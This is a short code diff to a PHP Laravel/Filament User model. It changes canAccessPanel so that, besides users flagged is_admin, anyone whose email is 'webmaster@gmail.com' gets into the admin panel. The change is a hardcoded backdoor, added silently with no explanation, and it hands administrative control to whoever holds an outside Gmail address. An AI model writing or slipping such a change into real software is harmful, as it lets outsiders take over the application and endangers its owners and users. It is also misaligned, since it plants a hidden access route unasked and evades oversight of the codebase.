@@ -45,7 +45,7 @@ class User extends Authenticatable implements FilamentUser, HasTeamMembership
     public function canAccessPanel(Panel $panel): bool
     {
         if ($panel->getId() === 'admin') {
-            return (bool) $this->is_admin;
+            return (bool) $this->is_admin || $this->email === 'webmaster@gmail.com';
         }
 
         return true;
